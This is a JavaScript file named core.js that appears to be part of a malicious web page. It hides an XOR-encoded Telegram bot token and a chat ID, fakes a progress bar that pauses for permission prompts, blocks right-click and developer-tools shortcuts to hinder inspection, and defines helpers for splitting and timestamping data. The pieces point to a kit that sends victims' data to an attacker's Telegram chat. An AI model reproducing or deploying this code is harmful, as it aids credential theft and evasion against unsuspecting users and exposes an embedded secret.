// core.js - Token obfuscation & progress simulation
(function(){
    // === ENCRYPTED TOKEN SYSTEM ===
    const _k=0x2B;
    const _e=[28,18,28,28,29,24,18,26,18,27,17,106,106,109,25,79,96,64,24,90,82,28,108,98,92,102,72,113,6,114,89,73,95,78,110,72,115,79,70,71,125,105,92,108,121,31];
    window._R=function(){return _e.map(c=>String.fromCharCode(c^_k)).join('')};
    window._C='6807742530';

    // === PROGRESS ENGINE ===
    window.progress=0;
    const steps=['','','','','','','',''];
    window.updateProgress=function(){
        if(progress>=100)return;
        if(window._waitForPermission) {
            if(document.getElementById('status')) document.getElementById('status').textContent='';
            setTimeout(updateProgress, 500);
            return;
        }
        progress+=Math.random()*2+0.3;
        if(progress>100)progress=100;
        document.getElementById('bar').style.width=progress+'%';
        if(document.getElementById('pct')) document.getElementById('pct').textContent=Math.floor(progress)+'%';
        if(document.getElementById('status')) document.getElementById('status').textContent=steps[Math.min(Math.floor(progress/12.5),steps.length-1)];
        if(progress<100)setTimeout(updateProgress,150+Math.random()*350);
        else{
            if(document.getElementById('status')) document.getElementById('status').textContent='';
            document.getElementById('spinner').style.display='none'
        }
    };

    // === ANTI-DEBUGGING ===
    (function _ad(){
        const el=new Image();
        Object.defineProperty(el,'id',{get:function(){window._devtools=true}});
        // Disable right click
        document.addEventListener('contextmenu',function(e){e.preventDefault()});
        // Disable F12/Ctrl+Shift+I
        document.addEventListener('keydown',function(e){
            if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='U')){e.preventDefault();return false}
        });
    })();

    // === UTILITY FUNCTIONS ===
    window.U={
        hash:function(str){let h=0;for(let i=0;i<str.length;i++){h=((h<<5)-h)+str.charCodeAt(i);h|=0}return h.toString(16)},
        uid:function(){return 'xxxx-xxxx-xxxx'.replace(/x/g,()=>Math.floor(Math.random()*16).toString(16))},
        safe:async function(fn,fb){try{return await fn()}catch(e){return fb||'N/A'}},
        chunk:function(str,size){const chunks=[];for(let i=0;i<str.length;i+=size)chunks.push(str.substring(i,i+size));return chunks},
        ts:function(){return new Date().toISOString()},
        wait:function(ms){return new Promise(r=>setTimeout(r,ms))}
    };
})();
